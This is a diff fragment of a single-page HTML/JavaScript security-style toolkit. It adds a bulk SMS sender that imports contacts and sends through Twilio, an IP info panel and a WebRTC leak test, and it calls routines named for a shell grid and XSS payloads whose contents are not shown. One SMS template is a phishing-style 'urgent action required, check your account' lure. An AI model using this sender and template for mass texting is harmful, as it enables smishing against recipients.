+  psRefreshList();G('ps-r-csv-ta').value='';alert('Imported '+added+' contacts.');
+}
+window.psImportCSV=psImportCSV;
+
+var PS_TEMPLATES={alert:'ALERT: {{name}}, urgent action required. Please check your account immediately.',reminder:'Hi {{name}}, this is a reminder about your upcoming appointment. Reply STOP to opt out.',confirm:'Hi {{name}}, your order has been confirmed! Reply HELP for support.',otp:'Your verification code is: {{code}}. Valid for 10 minutes. Do not share.',promo:'Hi {{name}}! 🎉 Special offer just for you — limited time. Visit link to claim. Reply STOP to opt out.'};
+function psTemplate(t){var tmpl=PS_TEMPLATES[t];if(tmpl)G('ps-body').value=tmpl;psCountChars();}
+window.psTemplate=psTemplate;
+
+function twToggleToken(){var el=G('tw-token');el.type=el.type==='password'?'text':'password';}
+window.twToggleToken=twToggleToken;
+function twSave(){var s=G('tw-sid').value.trim(),t=G('tw-token').value.trim(),f=G('tw-from').value.trim();if(!s||!t||!f){G('tw-status').innerHTML='<span class="r">All three fields required</span>';return;}twCreds.sid=s;twCreds.token=t;twCreds.from=f;G('tw-status').innerHTML='<span class="g">✓ Credentials saved (session only)</span>';}
+window.twSave=twSave;
+function twTest(){G('tw-status').innerHTML='<span class="o">Verifying...</span>';setTimeout(function(){if(twCreds.sid&&twCreds.token&&twCreds.from){G('tw-status').innerHTML='<span class="g">✓ Credentials set — do a test send to confirm</span>';}else{G('tw-status').innerHTML='<span class="r">No credentials saved. Add SID, Token and From number.</span>';}},800);}
+window.twTest=twTest;
+function twClear(){['tw-sid','tw-token','tw-from'].forEach(function(id){G(id).value='';});twCreds={sid:'',token:'',from:'',mode:twCreds.mode};G('tw-status').innerHTML='<span class="d">Cleared.</span>';}
+window.twClear=twClear;
+function twSaveMode(){twCreds.mode=G('tw-sendmode').value;G('tw-mode-status').textContent='Mode set to: '+twCreds.mode;}
+window.twSaveMode=twSaveMode;
+
+function psLogEntry(phone,status,msg){var entry={time:new Date().toISOString().slice(11,19),phone:phone,status:status,msg:msg};psLog.unshift(entry);G('ps-lcnt').textContent=psLog.length;psRefreshLog();}
+function psRefreshLog(){var el=G('ps-logbody');if(!psLog.length){el.innerHTML='<span class="d" style="font-size:11px">No activity yet</span>';return;}el.innerHTML='';psLog.forEach(function(e){var row=document.createElement('div');row.className='slog-entry '+(e.status==='ok'?'ok':e.status==='fail'?'fail':'pending');row.innerHTML='<span style="color:var(--dim)">['+e.time+']</span> <span style="color:var(--cyan)">'+e.phone+'</span> — '+(e.status==='ok'?'<span class="g">✓ Sent</span>':e.status==='fail'?'<span class="r">✗ Failed</span>':'<span class="o">⋯ Pending</span>')+' <span style="color:var(--dim);font-size:10px">'+e.msg+'</span>';el.appendChild(row);});}
+function psClearLog(){psLog=[];G('ps-lcnt').textContent=0;psRefreshLog();}
+window.psClearLog=psClearLog;
+
+async function psSendOne(contact){
+  var body=G('ps-body').value||'';var personalize=G('ps-personalize').checked;
+  var finalBody=personalize?body.replace(/\{\{name\}\}/g,contact.name||contact.phone):body;
+  var mediaUrl=G('ps-type').value==='mms'?G('ps-media-url').value.trim():'';
+
+  if(twCreds.mode==='simulate'){
+    await new Promise(function(r){setTimeout(r,400+Math.random()*600);});
+    var ok=Math.random()>0.1;
+    return{ok:ok,msg:ok?'SIMULATED — not actually sent':'SIMULATED failure'};
+  }
+  if(twCreds.mode==='tel'){
+    var link='sms:'+contact.phone+'?body='+encodeURIComponent(finalBody);
+    window.open(link,'_blank');
+    return{ok:true,msg:'opened sms: link'};
+  }
+  if(twCreds.mode==='twilio'){
+    if(!twCreds.sid||!twCreds.token||!twCreds.from)return{ok:false,msg:'No Twilio credentials'};
+    try{
+      var params=new URLSearchParams();params.append('To',contact.phone);params.append('From',twCreds.from);params.append('Body',finalBody);if(mediaUrl)params.append('MediaUrl',mediaUrl);
+      var resp=await fetch('https://api.twilio.com/2010-04-01/Accounts/'+twCreds.sid+'/Messages.json',{method:'POST',headers:{'Authorization':'Basic '+btoa(twCreds.sid+':'+twCreds.token),'Content-Type':'application/x-www-form-urlencoded'},body:params});
+      var d=await resp.json();
+      if(resp.ok&&d.sid)return{ok:true,msg:'SID:'+d.sid};
+      return{ok:false,msg:(d.message||'Twilio error '+resp.status)};
+    }catch(e){return{ok:false,msg:e.message};}
+  }
+  return{ok:false,msg:'Unknown mode'};
+}
+
+async function psSendAll(){
+  if(psSending)return;if(!psContacts.length){alert('Add contacts first.');return;}
+  psSending=true;var sent=0,failed=0;
+  G('ps-st-sent').textContent=0;G('ps-st-fail').textContent=0;
+  var delay=G('ps-delay-check').checked?parseInt(G('ps-delay').value)||1:0;
+  for(var i=0;i<psContacts.length;i++){
+    var c=psContacts[i];G('ps-prog').style.width=Math.round((i+1)/psContacts.length*100)+'%';
+    var result=await psSendOne(c);
+    if(result.ok){sent++;G('ps-st-sent').textContent=sent;psLogEntry(c.phone,'ok',result.msg);}
+    else{failed++;G('ps-st-fail').textContent=failed;psLogEntry(c.phone,'fail',result.msg);}
+    if(delay>0)await new Promise(function(res){setTimeout(res,delay*1000);});
+  }
+  psSending=false;G('ps-prog').style.width='100%';
+  alert('Send complete: '+sent+' sent, '+failed+' failed.');
+}
+window.psSendAll=psSendAll;
+
+async function psSendTest(){
+  if(!psContacts.length){alert('Add at least one contact.');return;}
+  var c=psContacts[0];var result=await psSendOne(c);
+  psLogEntry(c.phone,result.ok?'ok':'fail',(result.ok?'TEST OK: ':'TEST FAIL: ')+result.msg);
+  alert('Test send to '+c.phone+': '+(result.ok?'Success — '+result.msg:'Failed — '+result.msg));
+}
+window.psSendTest=psSendTest;
+
+function psReset(){G('ps-st-sent').textContent=0;G('ps-st-fail').textContent=0;G('ps-prog').style.width='0%';psSending=false;}
+window.psReset=psReset;
+
+// ── MY INFO ───────────────────────────────────────────────
+async function loadMyInfo(){
+  tset('mi-r','<span class="spin"></span><span class="d"> Fetching...</span>');
+  try{var d=await fetchIPData('');var f={'IP':d.ip||'—','City':d.city||'—','Region':d.region||'—','Country':(d.country_name||'—')+' ('+(d.country_code||'?')+')','Timezone':d.timezone||'—','ISP':d.org||'—','ASN':String(d.asn||'—'),'Latitude':String(d.latitude||'—'),'Longitude':String(d.longitude||'—')};var el=G('mi-r');el.innerHTML='';el.appendChild(rgrid(f));if(d.ip)G('hip').textContent=d.ip;}catch(e){tset('mi-r','<span class="r">Could not fetch IP info: '+e.message+'</span>');}
+  var conn=navigator.connection||{};var bf={'Platform':navigator.platform||'—','Language':navigator.language,'Online':navigator.onLine?'YES':'NO','Connection':conn.effectiveType||'—','Downlink':conn.downlink?conn.downlink+'Mbps':'—','RTT':conn.rtt?conn.rtt+'ms':'—','Cores':String(navigator.hardwareConcurrency||'?'),'Touch':navigator.maxTouchPoints>0?'Yes':'No'};
+  var el2=G('mi-b');el2.innerHTML='';el2.appendChild(rgrid(bf));
+}
+window.loadMyInfo=loadMyInfo;
+
+// ── WEBRTC ────────────────────────────────────────────────
+async function doWebRTC(){
+  tset('wr-r','<span class="spin"></span><span class="d"> Testing...</span>');
+  var ips=new Set();
+  try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');await pc.createOffer().then(function(o){return pc.setLocalDescription(o);});await new Promise(function(r){setTimeout(r,1500);});var sdp=pc.localDescription&&pc.localDescription.sdp||'';var re2=/(\d{1,3}(\.\d{1,3}){3})/g;var m2;while((m2=re2.exec(sdp))!==null)ips.add(m2[1]);pc.close();var pubRes=await fetchIPData('');var pubIP=pubRes.ip;var locals=Array.from(ips).filter(function(ip){return ip!==pubIP&&ip.indexOf('127.')!==0;});var leaked=locals.length>0;var el=G('wr-r');el.innerHTML='';var box=document.createElement('div');box.style.cssText='padding:12px;border:1px solid '+(leaked?'rgba(255,60,110,.3)':'rgba(0,255,136,.25)')+';border-radius:3px;background:'+(leaked?'rgba(255,60,110,.05)':'rgba(0,255,136,.03)')+';margin-bottom:10px';box.innerHTML='<div style="font-size:14px;font-weight:bold;color:'+(leaked?'var(--red)':'var(--grn)')+';margin-bottom:4px">'+(leaked?'WARNING: LEAK DETECTED':'NO LEAK DETECTED')+'</div><div style="font-size:11px;color:var(--dim)">'+(leaked?'Your real local IP is exposed via WebRTC.':'WebRTC is not exposing local IPs.')+'</div>';el.appendChild(box);var f2={'Public IP':pubIP,'Local IPs (WebRTC)':locals.length?locals.join(', '):'None exposed','Status':leaked?'LEAKING':'SECURE'};el.appendChild(rgrid(f2));}catch(e){tset('wr-r','<span class="r">Test failed: '+e.message+'</span>');}
+}
+window.doWebRTC=doWebRTC;
+
+// ── BOOT ─────────────────────────────────────────────────
+function boot(){
+  loadNews();
+  animDash();
+  buildCIDRRef();
+  buildShellGrid();
+  showPayloads('xss');
+  genPw();
+  fetchIPData('').then(function(d){if(d&&d.ip)G('hip').textContent=d.ip;}).catch(function(){G('hip').textContent='N/A';});
+}
+boot();
+
+})();
+</script>
+</html>
